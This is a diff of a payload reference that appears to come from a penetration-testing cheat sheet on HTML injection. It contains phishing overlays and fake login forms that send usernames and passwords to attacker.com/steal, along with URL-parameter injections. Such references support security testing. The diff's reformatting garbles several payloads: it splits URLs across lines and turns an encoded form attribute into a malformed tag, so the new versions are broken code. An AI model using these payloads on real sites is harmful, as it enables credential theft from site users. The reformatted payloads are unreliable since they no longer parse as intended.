@@ -6,18 +6,22 @@ Payload persists in database:
 
 ```html
 <!-- Profile bio injection -->
-Name: John Doe
-Bio: <div style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;">
-     <h1>Site Under Maintenance</h1>
-     <p>Please login at <a href="http://attacker.com/login">portal.company.com</a></p>
-     </div>
+Name: John Doe Bio:
+<div
+  style="position:absolute;top:0;left:0;width:100%;height:100%;background:white;"
+>
+  <h1>Site Under Maintenance</h1>
+  <p>
+    Please login at <a href="http://attacker.com/login">portal.company.com</a>
+  </p>
+</div>
 
 <!-- Comment injection -->
 Great article!
 <form action="http://attacker.com/steal" method="POST">
-    <input name="username" placeholder="Session expired. Enter username:">
-    <input name="password" type="password" placeholder="Password:">
-    <input type="submit" value="Login">
+  <input name="username" placeholder="Session expired. Enter username:" />
+  <input name="password" type="password" placeholder="Password:" />
+  <input type="submit" value="Login" />
 </form>
 ```
 
@@ -27,10 +31,14 @@ Payload in URL parameters:
 
 ```html
 <!-- URL injection -->
-http://target.com/welcome?name=<h1>Welcome%20Admin</h1><form%20action="http://attacker.com/steal">
-
-<!-- Search result injection -->
-http://target.com/search?q=<marquee>Your%20account%20has%20been%20compromised</marquee>
+http://target.com/welcome?name=
+<h1>Welcome%20Admin</h1>
+<form%20action ="http://attacker.com/steal">
+  <!-- Search result injection -->
+  http://target.com/search?q=<marquee>
+    Your%20account%20has%20been%20compromised
+  </marquee></form%20action
+>
 ```
 
 #### Reflected POST Injection
@@ -53,8 +61,9 @@ Inject into displayed URLs:
 
 ```html
 <!-- If URL is displayed on page -->
-http://target.com/page/<h1>Injected</h1>
+http://target.com/page/
+<h1>Injected</h1>
 
 <!-- Path-based injection -->
-http://target.com/users/<img src=x>/profile
+http://target.com/users/<img src="x" />/profile
 ```
